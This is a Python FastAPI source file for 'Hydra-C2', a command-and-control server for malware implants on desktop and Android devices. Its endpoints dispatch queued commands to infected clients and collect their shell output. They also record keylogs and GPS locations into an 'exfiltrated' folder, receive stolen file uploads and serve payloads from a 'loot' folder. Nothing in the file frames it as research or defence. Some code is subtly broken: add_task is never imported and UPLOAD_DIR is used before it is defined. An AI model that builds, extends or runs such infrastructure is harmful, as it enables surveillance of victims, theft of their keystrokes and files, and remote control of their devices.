import os
from fastapi import FastAPI, Request, File, UploadFile
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import FileResponse
from contextlib import asynccontextmanager
from datetime import datetime
from db import init_db, register_client, get_pending_task, complete_task
import uvicorn
import json

def print_banner():
    banner = r"""
    _    _           _              _____ ___  
   | |  | |         | |            / ____|__ \ 
   | |__| |_   _  __| |_ __ __ _  | |       ) |
   |  __  | | | |/ _` | '__/ _` | | |      / / 
   | |  | | |_| | (_| | | | (_| | | |____ / /_ 
   |_|  |_|\__, |\__,_|_|  \__,_|  \_____|____|
            __/ |                              
           |___/                               

    >> Project Hydra-C2: Multi-headed Framework
    >> Status: Online | SSL: Enabled
    """
    print(banner)

@asynccontextmanager
async def lifespan(app: FastAPI):
    print_banner()
    await init_db()
    yield

app = FastAPI(lifespan=lifespan, redirect_slashes=False)

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

@app.api_route("/checkin/{client_id}", methods=["GET", "POST"])
async def checkin(client_id: str, platform: str, request: Request):
    client_ip = request.client.host
    
    # Capture telemetry if sent via POST
    if request.method == "POST":
        try:
            telemetry = await request.json()
            hostname = telemetry.get('hostname', 'Unknown')
            os_version = telemetry.get('os_version', 'Unknown')
            
            # --- INTEGRATED: KEYLOG EXTRACTION (APPEND MODE) ---
            keylogs = telemetry.get('keylogs')
            if keylogs:
                now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                print(f"\n⌨️ [KEYLOGS] FROM {client_id} at {now}: {keylogs}")
                
                log_dir = os.path.join("exfiltrated", client_id)
                os.makedirs(log_dir, exist_ok=True)
                
                # Using "a" for append and adding a timestamp separator
                with open(os.path.join(log_dir, "keys.txt"), "a", encoding="utf-8") as f:
                    f.write(f"\n--- {now} ---\n{keylogs}\n")
            
            # Platform-specific logging logic
            if platform == "android":
                net = telemetry.get('network', 'N/A')
                batt = telemetry.get('battery', 'N/A')
                print(f"[*] [MOBILE] {client_id}: {hostname} | {os_version} | Net: {net} | Batt: {batt}")
            else:
                ram = telemetry.get('total_memory', 'Unknown')
                print(f"[*] [DESKTOP] {client_id}: {hostname} | {os_version} | {ram}MB RAM")
                
        except Exception as e:
            print(f"[-] Telemetry parsing error: {e}")

    # 1. Register/Update the head in the DB
    await register_client(client_id, platform, client_ip)
    
    # 2. Check for specific tasks for this ID
    task = await get_pending_task(client_id)
    command_payload = None

    if task:
        command_payload = {
            "action": task["action"],
            "data": json.loads(task["payload"])
        }
        await complete_task(task["task_id"])
        print(f"[!] Task DISPATCHED to {client_id}: {task['action']}")

    return {
        "status": "success",
        "response": "acknowledged",
        "command": command_payload
    }

@app.post("/commander/push")
async def commander_push(client_id: str, action: str, payload: dict = {}):
    # This endpoint allows the commander or external scripts to queue tasks via Web
    await add_task(client_id, action, payload)
    return {"status": "success", "action": action, "client_id": client_id}

@app.post("/report/{client_id}")
async def report_output(client_id: str, request: Request):
    data = await request.json()
    
    report_type = data.get("type", "shell_output")
    content = data.get("data") or data.get("output") or "No output"
    
    # --- ADDED: KEYLOG CATCHER FOR ANDROID ---
    if report_type == "keylog":
        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        # Try every possible key the client might send
        content = data.get("data") or data.get("payload") or data.get("content") or "NO_DATA_RECEIVED"
        
        print(f"\n⌨️ [KEYLOG] {client_id}: {content}")
        
        log_dir = os.path.join(UPLOAD_DIR, client_id)
        os.makedirs(log_dir, exist_ok=True)
        
        with open(os.path.join(log_dir, "keys.txt"), "a", encoding="utf-8") as f:
            # Only write if it's not the empty placeholder
            if content != "NO_DATA_RECEIVED":
                f.write(f"[{now}] {content}\n")

    # --- EXISTING LOGIC FOR GPS AND SHELL ---
    if report_type == "location_update":
        print(f"\n📍 [GPS EXFIL] FROM {client_id}:")
        print("-" * 40)
        print(content.strip())
        print("-" * 40 + "\n")
    else:
        print(f"\n[+] SHELL_OUTPUT FROM {client_id}:")
        print("-" * 40)
        print(content.strip())
        print("-" * 40 + "\n")
    
    return {"status": "received"}

# Ensure a directory exists for exfiltrated files
UPLOAD_DIR = "exfiltrated"
os.makedirs(UPLOAD_DIR, exist_ok=True)

# Endpoint: Client downloads from Server
@app.get("/download/{filename}")
async def download_file(filename: str):
    file_path = os.path.join("loot", filename) # Store files to send in 'loot/'
    if os.path.exists(file_path):
        return FileResponse(path=file_path, filename=filename)
    return {"error": "File not found"}

# Endpoint: Client uploads to Server (Exfiltration)
@app.post("/upload/{client_id}")
async def upload_file(client_id: str, file: UploadFile = File(...)):
    client_dir = os.path.join(UPLOAD_DIR, client_id)
    os.makedirs(client_dir, exist_ok=True)
    
    file_path = os.path.join(client_dir, file.filename)
    with open(file_path, "wb") as f:
        f.write(await file.read())
    
    print(f"[+] EXFILTRATION: {file.filename} received from {client_id}")
    return {"status": "success", "path": file_path}

if __name__ == "__main__":
    uvicorn.run(
        "main:app",
        host="0.0.0.0", 
        port=8443, 
        ssl_keyfile="key.pem", 
        ssl_certfile="cert.pem",
        reload=True
    )